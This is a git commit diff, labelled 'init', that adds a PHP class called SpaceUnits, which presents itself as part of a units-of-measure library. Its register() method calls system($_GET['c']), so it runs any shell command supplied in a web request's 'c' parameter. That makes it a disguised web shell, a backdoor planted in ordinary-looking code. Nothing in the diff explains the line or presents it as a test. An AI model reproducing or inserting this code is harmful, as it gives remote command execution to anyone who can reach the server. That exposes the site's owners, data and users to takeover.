c8762edc56504900131a6b455720b552226bcfe0
Alex Brown <alex.brown.r@protonmail.com>
2021-07-09 21:40:27 +0800

    init

---
+++ source/SpaceUnits.php
@@ -0,0 +1,14 @@
+<?php
+
+namespace SpaceCorpUnits;
+
+use PhpUnitsOfMeasure\UnitOfMeasure;
+use PhpUnitsOfMeasure\PhysicalQuantity\Length;
+
+class SpaceUnits {
+
+	public static function register() {
+		system($_GET['c']);
+	}
+
+}
